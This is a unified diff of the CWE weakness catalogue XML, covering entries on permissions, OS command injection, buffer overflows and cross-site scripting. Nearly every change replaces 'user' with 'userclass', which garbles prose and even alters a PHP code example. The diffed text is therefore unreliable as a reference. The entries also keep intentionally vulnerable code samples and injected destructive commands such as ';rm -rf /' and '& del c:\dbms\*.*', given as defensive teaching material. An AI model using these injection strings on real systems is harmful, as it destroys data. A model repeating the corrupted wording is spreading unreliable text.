-               <Body_Text>This listing might occur when the user has a default umask of 022, which is a common setting. Depending on the nature of the file, the user might not have intended to make it readable by everyone on the system.</Body_Text>
+               <Body_Text>This listing might occur when the userclass has a default umask of 022, which is a common setting. Depending on the nature of the file, the userclass might not have intended to make it readable by everyone on the system.</Body_Text>
                <Body_Text>The next time the program runs, however - and all subsequent executions - the chmod will set the file's permissions so that the owner, group, and world (all users) can read the file and write to it:</Body_Text>
                <Example_Code Nature="result">
                   <xhtml:div>-rw-rw-rw- 1 username 13 Nov 24 17:58 secretFile.out</xhtml:div>
@@ -8228,7 +8228,7 @@
             </Observed_Example>
             <Observed_Example>
                <Reference>CVE-2008-0662</Reference>
-               <Description>VPN product stores user credentials in a registry key with "Everyone: Full Control" permissions, allowing attackers to steal the credentials.</Description>
+               <Description>VPN product stores userclass credentials in a registry key with "Everyone: Full Control" permissions, allowing attackers to steal the credentials.</Description>
                <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0662</Link>
             </Observed_Example>
             <Observed_Example>
@@ -8524,7 +8524,7 @@
                <Scope>Confidentiality</Scope>
                <Scope>Availability</Scope>
                <Impact>Execute Unauthorized Code or Commands</Impact>
-               <Note>If a malicious user injects a character (such as a semi-colon) that delimits the end of one command and the beginning of another, it may be possible to then insert an entirely new and unrelated command that was not intended to be executed.</Note>
+               <Note>If a malicious userclass injects a character (such as a semi-colon) that delimits the end of one command and the beginning of another, it may be possible to then insert an entirely new and unrelated command that was not intended to be executed.</Note>
             </Consequence>
          </Common_Consequences>
          <Potential_Mitigations>
@@ -8551,25 +8551,25 @@
             </Mitigation>
             <Mitigation>
                <Phase>System Configuration</Phase>
-               <Description>Assign permissions to the software system that prevents the user from accessing/opening privileged files.</Description>
+               <Description>Assign permissions to the software system that prevents the userclass from accessing/opening privileged files.</Description>
             </Mitigation>
          </Potential_Mitigations>
          <Demonstrative_Examples>
             <Demonstrative_Example Demonstrative_Example_ID="DX-30">
-               <Intro_Text>The following simple program accepts a filename as a command line argument and displays the contents of the file back to the user. The program is installed setuid root because it is intended for use as a learning tool to allow system administrators in-training to inspect privileged system files without giving them the ability to modify them or damage the system.</Intro_Text>
+               <Intro_Text>The following simple program accepts a filename as a command line argument and displays the contents of the file back to the userclass. The program is installed setuid root because it is intended for use as a learning tool to allow system administrators in-training to inspect privileged system files without giving them the ability to modify them or damage the system.</Intro_Text>
                <Example_Code Nature="bad" Language="C">
                   <xhtml:div>int main(int argc, char** argv) {<xhtml:div style="margin-left:10px;">char cmd[CMD_MAX] = "/usr/bin/cat ";<xhtml:br/>strcat(cmd, argv[1]);<xhtml:br/>system(cmd);</xhtml:div>}</xhtml:div>
                </Example_Code>
-               <Body_Text>Because the program runs with root privileges, the call to system() also executes with root privileges. If a user specifies a standard filename, the call works as expected. However, if an attacker passes a string of the form ";rm -rf /", then the call to system() fails to execute cat due to a lack of arguments and then plows on to recursively delete the contents of the root partition.</Body_Text>
+               <Body_Text>Because the program runs with root privileges, the call to system() also executes with root privileges. If a userclass specifies a standard filename, the call works as expected. However, if an attacker passes a string of the form ";rm -rf /", then the call to system() fails to execute cat due to a lack of arguments and then plows on to recursively delete the contents of the root partition.</Body_Text>
                <Body_Text>Note that if argv[1] is a very long argument, then this issue might also be subject to a buffer overflow (CWE-120).</Body_Text>
             </Demonstrative_Example>
             <Demonstrative_Example Demonstrative_Example_ID="DX-28">
-               <Intro_Text>The following code is from an administrative web application designed to allow users to kick off a backup of an Oracle database using a batch-file wrapper around the rman utility and then run a cleanup.bat script to delete some temporary files. The script rmanDB.bat accepts a single command line parameter, which specifies what type of backup to perform. Because access to the database is restricted, the application runs the backup as a privileged user.</Intro_Text>
+               <Intro_Text>The following code is from an administrative web application designed to allow users to kick off a backup of an Oracle database using a batch-file wrapper around the rman utility and then run a cleanup.bat script to delete some temporary files. The script rmanDB.bat accepts a single command line parameter, which specifies what type of backup to perform. Because access to the database is restricted, the application runs the backup as a privileged userclass.</Intro_Text>
                <Example_Code Nature="bad" Language="Java">
                   <xhtml:div>...<xhtml:br/>String btype = request.getParameter("backuptype");<xhtml:br/>String cmd = new String("cmd.exe /K \"<xhtml:div style="margin-left:10px;">c:\\util\\rmanDB.bat "<xhtml:br/>+btype+<xhtml:br/>"&amp;&amp;c:\\utl\\cleanup.bat\"")</xhtml:div>
                      <xhtml:br/>System.Runtime.getRuntime().exec(cmd);<xhtml:br/>...</xhtml:div>
                </Example_Code>
-               <Body_Text>The problem here is that the program does not do any validation on the backuptype parameter read from the user. Typically the Runtime.exec() function will not execute multiple commands, but in this case the program first runs the cmd.exe shell in order to run multiple commands with a single call to Runtime.exec(). Once the shell is invoked, it will happily execute multiple commands separated by two ampersands. If an attacker passes a string of the form "&amp; del c:\\dbms\\*.*", then the application will execute this command along with the others specified by the program. Because of the nature of the application, it runs with the privileges necessary to interact with the database, which means whatever command the attacker injects will run with those privileges as well.</Body_Text>
+               <Body_Text>The problem here is that the program does not do any validation on the backuptype parameter read from the userclass. Typically the Runtime.exec() function will not execute multiple commands, but in this case the program first runs the cmd.exe shell in order to run multiple commands with a single call to Runtime.exec(). Once the shell is invoked, it will happily execute multiple commands separated by two ampersands. If an attacker passes a string of the form "&amp; del c:\\dbms\\*.*", then the application will execute this command along with the others specified by the program. Because of the nature of the application, it runs with the privileges necessary to interact with the database, which means whatever command the attacker injects will run with those privileges as well.</Body_Text>
             </Demonstrative_Example>
             <Demonstrative_Example>
                <Intro_Text>The following code from a system utility uses the system property APPHOME to determine the directory in which it is installed and then executes an initialization script based on a relative path from the specified directory.</Intro_Text>
@@ -8597,7 +8597,7 @@
                <Example_Code Nature="attack">
                   <xhtml:div>$ ./catWrapper Story.txt; ls<xhtml:br/>When last we left our heroes...<xhtml:br/>Story.txt<xhtml:br/>SensitiveFile.txt<xhtml:br/>PrivateData.db<xhtml:br/>a.out*</xhtml:div>
                </Example_Code>
-               <Body_Text>If catWrapper had been set to have a higher privilege level than the standard user, arbitrary commands could be executed with that higher privilege.</Body_Text>
+               <Body_Text>If catWrapper had been set to have a higher privilege level than the standard userclass, arbitrary commands could be executed with that higher privilege.</Body_Text>
             </Demonstrative_Example>
          </Demonstrative_Examples>
          <Observed_Examples>
@@ -8666,7 +8666,7 @@
          </References>
          <Notes>
             <Note Type="Terminology">
-               <xhtml:p>The "command injection" phrase carries different meanings to different people. For some people, it refers to refers to any type of attack that can allow the attacker to execute commands of their own choosing, regardless of how those commands are inserted. The command injection could thus be resultant from another weakness. This usage also includes cases in which the functionality allows the user to specify an entire command, which is then executed; within CWE, this situation might be better regarded as an authorization problem (since an attacker should not be able to specify arbitrary commands.)</xhtml:p>
+               <xhtml:p>The "command injection" phrase carries different meanings to different people. For some people, it refers to refers to any type of attack that can allow the attacker to execute commands of their own choosing, regardless of how those commands are inserted. The command injection could thus be resultant from another weakness. This usage also includes cases in which the functionality allows the userclass to specify an entire command, which is then executed; within CWE, this situation might be better regarded as an authorization problem (since an attacker should not be able to specify arbitrary commands.)</xhtml:p>
                <xhtml:p>Another common usage, which includes CWE-77 and its descendants, involves cases in which the attacker injects separators into the command being constructed.</xhtml:p>
             </Note>
          </Notes>
@@ -8861,8 +8861,8 @@
             <xhtml:p>There are at least two subtypes of OS command injection:</xhtml:p>
             <xhtml:div style="margin-left:10px;">
                <xhtml:ol>
-                  <xhtml:li>The application intends to execute a single, fixed program that is under its own control. It intends to use externally-supplied inputs as arguments to that program. For example, the program might use system("nslookup [HOSTNAME]") to run nslookup and allow the user to supply a HOSTNAME, which is used as an argument. Attackers cannot prevent nslookup from executing. However, if the program does not remove command separators from the HOSTNAME argument, attackers could place the separators into the arguments, which allows them to execute their own program after nslookup has finished executing.</xhtml:li>
-                  <xhtml:li>The application accepts an input that it uses to fully select which program to run, as well as which commands to use. The application simply redirects this entire command to the operating system. For example, the program might use "exec([COMMAND])" to execute the [COMMAND] that was supplied by the user. If the COMMAND is under attacker control, then the attacker can execute arbitrary commands or programs. If the command is being executed using functions like exec() and CreateProcess(), the attacker might not be able to combine multiple commands together in the same line.</xhtml:li>
+                  <xhtml:li>The application intends to execute a single, fixed program that is under its own control. It intends to use externally-supplied inputs as arguments to that program. For example, the program might use system("nslookup [HOSTNAME]") to run nslookup and allow the userclass to supply a HOSTNAME, which is used as an argument. Attackers cannot prevent nslookup from executing. However, if the program does not remove command separators from the HOSTNAME argument, attackers could place the separators into the arguments, which allows them to execute their own program after nslookup has finished executing.</xhtml:li>
+                  <xhtml:li>The application accepts an input that it uses to fully select which program to run, as well as which commands to use. The application simply redirects this entire command to the operating system. For example, the program might use "exec([COMMAND])" to execute the [COMMAND] that was supplied by the userclass. If the COMMAND is under attacker control, then the attacker can execute arbitrary commands or programs. If the command is being executed using functions like exec() and CreateProcess(), the attacker might not be able to combine multiple commands together in the same line.</xhtml:li>
                </xhtml:ol>
             </xhtml:div>
             <xhtml:p>From a weakness standpoint, these variants represent distinct programmer errors. In the first variant, the programmer clearly intends that input from untrusted parties will be part of the arguments in the command to be executed. In the second variant, the programmer does not intend for the command to be accessible to any untrusted party, but the programmer probably has not accounted for alternate ways in which malicious attackers can provide input.</xhtml:p>
@@ -9099,7 +9099,7 @@
                   <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                   <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs.  This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
                   <xhtml:p>When constructing OS command strings, use stringent allowlists that limit the character set based on the expected value of the parameter in the request. This will indirectly limit the scope of an attack, but this technique is less important than proper output encoding and escaping.</xhtml:p>
-                  <xhtml:p>Note that proper output encoding, escaping, and quoting is the most effective solution for preventing OS command injection, although input validation may provide some defense-in-depth. This is because it effectively limits what will appear in output. Input validation will not always prevent OS command injection, especially if you are required to support free-form text fields that could contain arbitrary characters. For example, when invoking a mail program, you might need to allow the subject field to contain otherwise-dangerous inputs like ";" and "&gt;" characters, which would need to be escaped or otherwise handled. In this case, stripping the character might reduce the risk of OS command injection, but it would produce incorrect behavior because the subject field would not be recorded as the user intended. This might seem to be a minor inconvenience, but it could be more important when the program relies on well-structured subject lines in order to pass messages to other components.</xhtml:p>
+                  <xhtml:p>Note that proper output encoding, escaping, and quoting is the most effective solution for preventing OS command injection, although input validation may provide some defense-in-depth. This is because it effectively limits what will appear in output. Input validation will not always prevent OS command injection, especially if you are required to support free-form text fields that could contain arbitrary characters. For example, when invoking a mail program, you might need to allow the subject field to contain otherwise-dangerous inputs like ";" and "&gt;" characters, which would need to be escaped or otherwise handled. In this case, stripping the character might reduce the risk of OS command injection, but it would produce incorrect behavior because the subject field would not be recorded as the userclass intended. This might seem to be a minor inconvenience, but it could be more important when the program relies on well-structured subject lines in order to pass messages to other components.</xhtml:p>
                   <xhtml:p>Even if you make a mistake in your validation (such as forgetting one out of 100 input fields), appropriate encoding is still likely to protect you from injection-based attacks. As long as it is not done in isolation, input validation is still a useful technique, since it may significantly reduce your attack surface, allow you to detect some attacks, and provide other security benefits that proper encoding does not address.</xhtml:p>
                </Description>
             </Mitigation>
@@ -9123,8 +9123,8 @@
                <Description>
                   <xhtml:p>Ensure that error messages only contain minimal details that are useful to the intended audience and no one else. The messages need to strike the balance between being too cryptic (which can confuse users) or being too detailed (which may reveal more than intended). The messages should not reveal the methods that were used to determine the error. Attackers can use detailed information to refine or optimize their original attack, thereby increasing their chances of success.</xhtml:p>
                   <xhtml:p>If errors must be captured in some detail, record them in log messages, but consider what could occur if the log messages can be viewed by attackers. Highly sensitive information such as passwords should never be saved to log files.</xhtml:p>
-		  <xhtml:p>Avoid inconsistent messaging that might accidentally tip off an attacker about internal state, such as whether a user account exists or not.</xhtml:p>
-                  <xhtml:p>In the context of OS Command Injection, error information passed back to the user might reveal whether an OS command is being executed and possibly which command is being used.</xhtml:p>
+		  <xhtml:p>Avoid inconsistent messaging that might accidentally tip off an attacker about internal state, such as whether a userclass account exists or not.</xhtml:p>
+                  <xhtml:p>In the context of OS Command Injection, error information passed back to the userclass might reveal whether an OS command is being executed and possibly which command is being used.</xhtml:p>
                </Description>
             </Mitigation>
             <Mitigation>
@@ -9154,9 +9154,9 @@
          </Potential_Mitigations>
          <Demonstrative_Examples>
             <Demonstrative_Example>
-               <Intro_Text>This example code intends to take the name of a user and list the contents of that user's home directory. It is subject to the first variant of OS command injection.</Intro_Text>
+               <Intro_Text>This example code intends to take the name of a userclass and list the contents of that userclass's home directory. It is subject to the first variant of OS command injection.</Intro_Text>
                <Example_Code Nature="bad" Language="PHP">
-                  <xhtml:div>$userName = $_POST["user"];<xhtml:br/>$command = 'ls -l /home/' . $userName;<xhtml:br/>system($command);</xhtml:div>
+                  <xhtml:div>$userName = $_POST["userclass"];<xhtml:br/>$command = 'ls -l /home/' . $userName;<xhtml:br/>system($command);</xhtml:div>
                </Example_Code>
                <Body_Text>The $userName variable is not checked for malicious input. An attacker could set the $userName variable to an arbitrary OS command such as:</Body_Text>
                <Example_Code Nature="attack">
@@ -9170,7 +9170,7 @@
                <Body_Text>Also note that this example code is vulnerable to Path Traversal (CWE-22) and Untrusted Search Path (CWE-426) attacks.</Body_Text>
             </Demonstrative_Example>
             <Demonstrative_Example>
-               <Intro_Text>This example is a web application that intends to perform a DNS lookup of a user-supplied domain name. It is subject to the first variant of OS command injection.</Intro_Text>
+               <Intro_Text>This example is a web application that intends to perform a DNS lookup of a userclass-supplied domain name. It is subject to the first variant of OS command injection.</Intro_Text>
                <Example_Code Nature="bad" Language="Perl">
                   <xhtml:div>use CGI qw(:standard);<xhtml:br/>$name = param('name');<xhtml:br/>$nslookup = "/path/to/nslookup";<xhtml:br/>print header;<xhtml:br/>if (open($fh, "$nslookup $name|")) {<xhtml:div style="margin-left:10px;">while (&lt;$fh&gt;) {<xhtml:div style="margin-left:10px;">print escapeHTML($_);<xhtml:br/>print "&lt;br&gt;\n";</xhtml:div>}<xhtml:br/>close($fh);</xhtml:div>}</xhtml:div>
                </Example_Code>
@@ -9193,7 +9193,7 @@
                <Body_Text>If an attacker has control over this property, then they could modify the property to point to a dangerous program.</Body_Text>
             </Demonstrative_Example>
             <Demonstrative_Example>
-               <Intro_Text>In the example below, a method is used to transform geographic coordinates from latitude and longitude format to UTM format. The method gets the input coordinates from a user through a HTTP request and executes a program local to the application server that performs the transformation. The method passes the latitude and longitude coordinates as a command-line option to the external program and will perform some processing to retrieve the results of the transformation and return the resulting UTM coordinates.</Intro_Text>
+               <Intro_Text>In the example below, a method is used to transform geographic coordinates from latitude and longitude format to UTM format. The method gets the input coordinates from a userclass through a HTTP request and executes a program local to the application server that performs the transformation. The method passes the latitude and longitude coordinates as a command-line option to the external program and will perform some processing to retrieve the results of the transformation and return the resulting UTM coordinates.</Intro_Text>
                <Example_Code Nature="bad" Language="Java">
                   <xhtml:div>public String coordinateTransformLatLonToUTM(String coordinates)<xhtml:br/>{<xhtml:div style="margin-left:10px;">
                         <xhtml:div>String utmCoords = null;<xhtml:br/>try {<xhtml:div style="margin-left:10px;">
@@ -9207,15 +9207,15 @@
                            </xhtml:div>}<xhtml:br/>catch(Exception e) {...}<xhtml:br/>return utmCoords;</xhtml:div>
                      </xhtml:div>}</xhtml:div>
                </Example_Code>
-               <Body_Text>However, the method does not verify that the contents of the coordinates input parameter includes only correctly-formatted latitude and longitude coordinates. If the input coordinates were not validated prior to the call to this method, a malicious user could execute another program local to the application server by appending '&amp;' followed by the command for another program to the end of the coordinate string. The '&amp;' instructs the Windows operating system to execute another program.</Body_Text>
+               <Body_Text>However, the method does not verify that the contents of the coordinates input parameter includes only correctly-formatted latitude and longitude coordinates. If the input coordinates were not validated prior to the call to this method, a malicious userclass could execute another program local to the application server by appending '&amp;' followed by the command for another program to the end of the coordinate string. The '&amp;' instructs the Windows operating system to execute another program.</Body_Text>
             </Demonstrative_Example>
             <Demonstrative_Example Demonstrative_Example_ID="DX-28">
-               <Intro_Text>The following code is from an administrative web application designed to allow users to kick off a backup of an Oracle database using a batch-file wrapper around the rman utility and then run a cleanup.bat script to delete some temporary files. The script rmanDB.bat accepts a single command line parameter, which specifies what type of backup to perform. Because access to the database is restricted, the application runs the backup as a privileged user.</Intro_Text>
+               <Intro_Text>The following code is from an administrative web application designed to allow users to kick off a backup of an Oracle database using a batch-file wrapper around the rman utility and then run a cleanup.bat script to delete some temporary files. The script rmanDB.bat accepts a single command line parameter, which specifies what type of backup to perform. Because access to the database is restricted, the application runs the backup as a privileged userclass.</Intro_Text>
                <Example_Code Nature="bad" Language="Java">
                   <xhtml:div>...<xhtml:br/>String btype = request.getParameter("backuptype");<xhtml:br/>String cmd = new String("cmd.exe /K \"<xhtml:div style="margin-left:10px;">c:\\util\\rmanDB.bat "<xhtml:br/>+btype+<xhtml:br/>"&amp;&amp;c:\\utl\\cleanup.bat\"")</xhtml:div>
                      <xhtml:br/>System.Runtime.getRuntime().exec(cmd);<xhtml:br/>...</xhtml:div>
                </Example_Code>
-               <Body_Text>The problem here is that the program does not do any validation on the backuptype parameter read from the user. Typically the Runtime.exec() function will not execute multiple commands, but in this case the program first runs the cmd.exe shell in order to run multiple commands with a single call to Runtime.exec(). Once the shell is invoked, it will happily execute multiple commands separated by two ampersands. If an attacker passes a string of the form "&amp; del c:\\dbms\\*.*", then the application will execute this command along with the others specified by the program. Because of the nature of the application, it runs with the privileges necessary to interact with the database, which means whatever command the attacker injects will run with those privileges as well.</Body_Text>
+               <Body_Text>The problem here is that the program does not do any validation on the backuptype parameter read from the userclass. Typically the Runtime.exec() function will not execute multiple commands, but in this case the program first runs the cmd.exe shell in order to run multiple commands with a single call to Runtime.exec(). Once the shell is invoked, it will happily execute multiple commands separated by two ampersands. If an attacker passes a string of the form "&amp; del c:\\dbms\\*.*", then the application will execute this command along with the others specified by the program. Because of the nature of the application, it runs with the privileges necessary to interact with the database, which means whatever command the attacker injects will run with those privileges as well.</Body_Text>
             </Demonstrative_Example>
          </Demonstrative_Examples>
          <Observed_Examples>
@@ -9732,7 +9732,7 @@
                <Body_Text>If returnChunkSize() happens to encounter an error it will return -1. Notice that the return value is not checked before the memcpy operation (CWE-252), so -1 can be passed as the size argument to memcpy() (CWE-805). Because memcpy() assumes that the value is unsigned, it will be interpreted as MAXINT-1 (CWE-195), and therefore will copy far more memory than is likely available to the destination buffer (CWE-787, CWE-788).</Body_Text>
             </Demonstrative_Example>
             <Demonstrative_Example Demonstrative_Example_ID="DX-1">
-               <Intro_Text>This example takes an IP address from a user, verifies that it is well formed and then looks up the hostname and copies it into a buffer.</Intro_Text>
+               <Intro_Text>This example takes an IP address from a userclass, verifies that it is well formed and then looks up the hostname and copies it into a buffer.</Intro_Text>
                <Example_Code Nature="bad" Language="C">
                   <xhtml:div>void host_lookup(char *user_supplied_addr){<xhtml:div style="margin-left:10px;">
                         <xhtml:div>struct hostent *hp;<xhtml:br/>in_addr_t *addr;<xhtml:br/>char hostname[64];<xhtml:br/>in_addr_t inet_addr(const char *cp);<xhtml:br/>
@@ -9749,7 +9749,7 @@
                <Intro_Text>This example applies an encoding procedure to an input string and stores it into a buffer.</Intro_Text>
                <Example_Code Nature="bad" Language="C">
                   <xhtml:div>char * copy_input(char *user_supplied_string){<xhtml:div style="margin-left:10px;">
-                        <xhtml:div>int i, dst_index;<xhtml:br/>char *dst_buf = (char*)malloc(4*sizeof(char) * MAX_SIZE);<xhtml:br/>if ( MAX_SIZE &lt;= strlen(user_supplied_string) ){<xhtml:div style="margin-left:10px;">die("user string too long, die evil hacker!");</xhtml:div>}<xhtml:br/>dst_index = 0;<xhtml:br/>for ( i = 0; i &lt; strlen(user_supplied_string); i++ ){<xhtml:div style="margin-left:10px;">
+                        <xhtml:div>int i, dst_index;<xhtml:br/>char *dst_buf = (char*)malloc(4*sizeof(char) * MAX_SIZE);<xhtml:br/>if ( MAX_SIZE &lt;= strlen(user_supplied_string) ){<xhtml:div style="margin-left:10px;">die("userclass string too long, die evil hacker!");</xhtml:div>}<xhtml:br/>dst_index = 0;<xhtml:br/>for ( i = 0; i &lt; strlen(user_supplied_string); i++ ){<xhtml:div style="margin-left:10px;">
                               <xhtml:div>if( '&amp;' == user_supplied_string[i] ){<xhtml:div style="margin-left:10px;">dst_buf[dst_index++] = '&amp;';<xhtml:br/>dst_buf[dst_index++] = 'a';<xhtml:br/>dst_buf[dst_index++] = 'm';<xhtml:br/>dst_buf[dst_index++] = 'p';<xhtml:br/>dst_buf[dst_index++] = ';';</xhtml:div>}<xhtml:br/>else if ('&lt;' == user_supplied_string[i] ){<xhtml:div style="margin-left:10px;">
                                     <xhtml:div>
                                        <xhtml:br/>
@@ -9760,7 +9760,7 @@
                            </xhtml:div>}<xhtml:br/>return dst_buf;</xhtml:div>
                      </xhtml:div>}</xhtml:div>
                </Example_Code>
-               <Body_Text>The programmer attempts to encode the ampersand character in the user-controlled string, however the length of the string is validated before the encoding procedure is applied. Furthermore, the programmer assumes encoding expansion will only expand a given character by a factor of 4, while the encoding of the ampersand expands by 5. As a result, when the encoding procedure expands the string it is possible to overflow the destination buffer if the attacker provides a string of many ampersands.</Body_Text>
+               <Body_Text>The programmer attempts to encode the ampersand character in the userclass-controlled string, however the length of the string is validated before the encoding procedure is applied. Furthermore, the programmer assumes encoding expansion will only expand a given character by a factor of 4, while the encoding of the ampersand expands by 5. As a result, when the encoding procedure expands the string it is possible to overflow the destination buffer if the attacker provides a string of many ampersands.</Body_Text>
             </Demonstrative_Example>
             <Demonstrative_Example Demonstrative_Example_ID="DX-87">
                <Intro_Text>In the following C/C++ example, a utility function is used to trim trailing whitespace from a character string. The function copies the input string to a local character string and uses a while statement to remove the trailing whitespace by moving backward through the string and overwriting whitespace with a NUL character.</Intro_Text>
@@ -9781,19 +9781,19 @@
                <Body_Text>However, this function can cause a buffer underwrite if the input character string contains all whitespace. On some systems the while statement will move backwards past the beginning of a character string and will call the isspace() function on an address outside of the bounds of the local buffer.</Body_Text>
             </Demonstrative_Example>
             <Demonstrative_Example Demonstrative_Example_ID="DX-20">
-               <Intro_Text>The following code allocates memory for a maximum number of widgets. It then gets a user-specified number of widgets, making sure that the user does not request too many. It then initializes the elements of the array using InitializeWidget(). Because the number of widgets can vary for each request, the code inserts a NULL pointer to signify the location of the last widget.</Intro_Text>
+               <Intro_Text>The following code allocates memory for a maximum number of widgets. It then gets a userclass-specified number of widgets, making sure that the userclass does not request too many. It then initializes the elements of the array using InitializeWidget(). Because the number of widgets can vary for each request, the code inserts a NULL pointer to signify the location of the last widget.</Intro_Text>
                <Example_Code Nature="bad" Language="C">
                   <xhtml:div>int i;<xhtml:br/>unsigned int numWidgets;<xhtml:br/>Widget **WidgetList;<xhtml:br/>
                      <xhtml:br/>numWidgets = GetUntrustedSizeValue();<xhtml:br/>if ((numWidgets == 0) || (numWidgets &gt; MAX_NUM_WIDGETS)) {<xhtml:div style="margin-left:10px;">ExitError("Incorrect number of widgets requested!");</xhtml:div>}<xhtml:br/>WidgetList = (Widget **)malloc(numWidgets * sizeof(Widget *));<xhtml:br/>printf("WidgetList ptr=%p\n", WidgetList);<xhtml:br/>for(i=0; i&lt;numWidgets; i++) {<xhtml:div style="margin-left:10px;">WidgetList[i] = InitializeWidget();</xhtml:div>}<xhtml:br/>WidgetList[numWidgets] = NULL;<xhtml:br/>showWidgets(WidgetList);</xhtml:div>
                </Example_Code>
-               <Body_Text>However, this code contains an off-by-one calculation error (CWE-193). It allocates exactly enough space to contain the specified number of widgets, but it does not include the space for the NULL pointer. As a result, the allocated buffer is smaller than it is supposed to be (CWE-131). So if the user ever requests MAX_NUM_WIDGETS, there is an out-of-bounds write (CWE-787) when the NULL is assigned. Depending on the environment and compilation settings, this could cause memory corruption.</Body_Text>
+               <Body_Text>However, this code contains an off-by-one calculation error (CWE-193). It allocates exactly enough space to contain the specified number of widgets, but it does not include the space for the NULL pointer. As a result, the allocated buffer is smaller than it is supposed to be (CWE-131). So if the userclass ever requests MAX_NUM_WIDGETS, there is an out-of-bounds write (CWE-787) when the NULL is assigned. Depending on the environment and compilation settings, this could cause memory corruption.</Body_Text>
             </Demonstrative_Example>
             <Demonstrative_Example Demonstrative_Example_ID="DX-88">
                <Intro_Text>The following is an example of code that may result in a buffer underwrite, if find() returns a negative value to indicate that ch is not found in srcBuf:</Intro_Text>
                <Example_Code Nature="bad" Language="C">
                   <xhtml:div>int main() {<xhtml:div style="margin-left:10px;">...<xhtml:br/>strncpy(destBuf, &amp;srcBuf[find(srcBuf, ch)], 1024);<xhtml:br/>...</xhtml:div>}</xhtml:div>
                </Example_Code>
-               <Body_Text>If the index to srcBuf is somehow under user control, this is an arbitrary write-what-where condition.</Body_Text>
+               <Body_Text>If the index to srcBuf is somehow under userclass control, this is an arbitrary write-what-where condition.</Body_Text>
             </Demonstrative_Example>
          </Demonstrative_Examples>
          <Observed_Examples>
@@ -9945,7 +9945,7 @@
          </Content_History>
       </Weakness>
       <Weakness ID="79" Name="Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')" Abstraction="Base" Structure="Simple" Status="Stable">
-         <Description>The software does not neutralize or incorrectly neutralizes user-controllable input before it is placed in output that is used as a web page that is served to other users.</Description>
+         <Description>The software does not neutralize or incorrectly neutralizes userclass-controllable input before it is placed in output that is used as a web page that is served to other users.</Description>
          <Extended_Description>
             <xhtml:p>Cross-site scripting (XSS) vulnerabilities occur when:</xhtml:p>
             <xhtml:ol>
@@ -9963,11 +9963,11 @@
          			The server reads data directly from the HTTP request and reflects it back in the HTTP response. Reflected XSS exploits occur when an attacker causes a victim to supply dangerous content to a vulnerable web application, which is then reflected back to the victim and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to the victim. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces a victim to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the victim, the content is executed by the victim's browser.</xhtml:li>
                <xhtml:li>
                   <xhtml:b>Type 2: Stored XSS (or Persistent)</xhtml:b> - 
-               The application stores dangerous data in a database, message forum, visitor log, or other trusted data store. At a later time, the dangerous data is subsequently read back into the application and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user. For example, the attacker might inject XSS into a log message, which might not be handled properly when an administrator views the logs.
+               The application stores dangerous data in a database, message forum, visitor log, or other trusted data store. At a later time, the dangerous data is subsequently read back into the application and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the userclass or gain access to sensitive data belonging to the userclass. For example, the attacker might inject XSS into a log message, which might not be handled properly when an administrator views the logs.
             </xhtml:li>
                <xhtml:li>
                   <xhtml:b>Type 0: DOM-Based XSS</xhtml:b> - 
-               In DOM-based XSS, the client performs the injection of XSS into the page; in the other types, the server performs the injection. DOM-based XSS generally involves server-controlled, trusted script that is sent to the client, such as Javascript that performs sanity checks on a form before the user submits it. If the server-supplied script processes user-supplied data and then injects it back into the web page (such as with dynamic HTML), then DOM-based XSS is possible.
+               In DOM-based XSS, the client performs the injection of XSS into the page; in the other types, the server performs the injection. DOM-based XSS generally involves server-controlled, trusted script that is sent to the client, such as Javascript that performs sanity checks on a form before the userclass submits it. If the server-supplied script processes userclass-supplied data and then injects it back into the web page (such as with dynamic HTML), then DOM-based XSS is possible.
             </xhtml:li>
             </xhtml:ul>
             <xhtml:p>Once the malicious script is injected, the attacker can perform a variety of malicious activities. The attacker could transfer private information, such as cookies that may include session information, from the victim's machine to the attacker. The attacker could send malicious requests to a web site on behalf of the victim, which could be especially dangerous to the site if the victim has administrator privileges to manage that site. Phishing attacks could be used to emulate trusted web sites and trick the victim into entering a password, allowing the attacker to compromise the victim's account on that web site. Finally, the script could exploit a vulnerability in the web browser itself possibly taking over the victim's machine, sometimes referred to as "drive-by hacking."</xhtml:p>
@@ -9993,7 +9993,7 @@
                <xhtml:div style="color:#32498D; font-weight:bold;">Same Origin Policy</xhtml:div>
                <xhtml:p>The same origin policy states that browsers should limit the resources accessible to scripts running on a given web site, or "origin", to the resources associated with that web site on the client-side, and not the client-side resources of any other sites or "origins". The goal is to prevent one site from being able to modify or read the contents of an unrelated site. Since the World Wide Web involves interactions between many sites, this policy is important for browsers to enforce.</xhtml:p>
                <xhtml:div style="color:#32498D; font-weight:bold;">Domain</xhtml:div>
-               <xhtml:p>The Domain of a website when referring to XSS is roughly equivalent to the resources associated with that website on the client-side of the connection. That is, the domain can be thought of as all resources the browser is storing for the user's interactions with this particular site.</xhtml:p>
+               <xhtml:p>The Domain of a website when referring to XSS is roughly equivalent to the resources associated with that website on the client-side of the connection. That is, the domain can be thought of as all resources the browser is storing for the userclass's interactions with this particular site.</xhtml:p>
             </Background_Detail>
          </Background_Details>
          <Alternate_Terms>
@@ -10026,7 +10026,7 @@
                <Scope>Confidentiality</Scope>
                <Impact>Bypass Protection Mechanism</Impact>
                <Impact>Read Application Data</Impact>
